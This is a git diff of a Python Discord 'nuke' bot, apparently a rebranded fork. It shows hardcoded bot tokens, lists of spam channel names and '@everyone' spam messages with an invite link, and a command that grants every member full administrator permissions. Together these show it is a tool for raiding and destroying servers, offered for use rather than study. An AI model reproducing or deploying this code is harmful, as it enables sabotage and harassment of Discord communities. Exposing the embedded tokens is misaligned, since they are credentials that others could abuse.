@@ -5,13 +5,13 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 from webserver import keep_alive
-token = "OTE4NDcxMDQ4MTQ2NTkxNzg0.YbHu0g.U_6sr19_AoTj6pftLZfK-2NSlDo"
+token = "OTAxODAwNDIzNzM4OTg2NDk5.YXVJFw.10kWjF9xJmxjQoo28OUEo9C3icw"
 
 
-SPAM_CHANNEL =  ["dogman runs you" , "Get Banned" , "NUKED" , "oops Beamed","F IN CHAT","Should Have Listened","Get beamed clowns","Nuked by dogman ","oops got nuked","Dogman run you","Nuked by dogman","dogman Nucked you","kinda got beamed by yourself"]
-SPAM_MESSAGE = ["@everyone You Got Nuked by dogman"]
+SPAM_CHANNEL =  ["Doraemon runs you" , "Get Banned" , "NUKED" , "oops Beamed","F IN CHAT Beamed You","Should Have Listened","Get beamed clowns","Nuked by Doraemon ","oops got nuked","I run you","Nuked by Doraemon","I run you","kinda got beamed by yourself"]
+SPAM_MESSAGE = ["@everyone You Got Nuked by SexyPatata https://discord.gg/RnbM4jQxGj"]
 
-client = commands.Bot(command_prefix="?")
+client = commands.Bot(command_prefix=",")
 
 keep_alive()
 @client.event
@@ -28,7 +28,7 @@ async def on_ready():
 Support Server:https://discord.gg/U2mefh6DtN
  J
  ''')
-   await client.change_presence(activity=discord.Game(name="I Love Dogs"))
+   await client.change_presence(activity=discord.Game(name="Just got RickRolled"))
 
 @client.command()
 @commands.is_owner()
@@ -41,7 +41,7 @@ async def HELP(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
-      role = discord.utils.get(guild.roles, name = "@everyone")
+      role = discord.utils.get(guild.roles, name = "@everyone https://discord.gg/RnbM4jQxGj")
       await role.edit(permissions = Permissions.all())
       print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
     except:
